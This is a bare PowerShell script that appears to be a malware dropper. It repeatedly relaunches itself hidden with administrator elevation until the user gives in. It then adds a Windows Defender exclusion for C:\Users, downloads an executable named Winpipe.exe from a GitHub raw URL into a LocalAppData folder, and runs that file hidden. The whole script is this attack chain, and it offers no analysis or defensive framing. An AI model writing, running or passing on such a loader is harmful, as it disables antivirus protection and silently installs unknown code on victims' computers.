
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    (New-Object Security.Principal.WindowsPrincipal $id).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    $self = $MyInvocation.MyCommand.Path
    while (-not (Test-Admin)) {
        try {
            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @(
                '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$self`""
            ) -Wait
        } catch {
            Start-Sleep -Milliseconds 20
        }
    }
    exit
}



Add-MpPreference -ExclusionPath 'C:\Users' -ErrorAction SilentlyContinue

$dir = Join-Path $env:LOCALAPPDATA 'pipe'
New-Item -ItemType Directory -Path $dir -Force | Out-Null

$url = 'https://raw.githubusercontent.com/westoakstudios/main/main/Winpipe.exe'
$exe = Join-Path $dir 'Winpipe.exe'

try {
    Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing
} catch {
    exit 1
}

Start-Process -FilePath $exe -WorkingDirectory $dir -WindowStyle Hidden
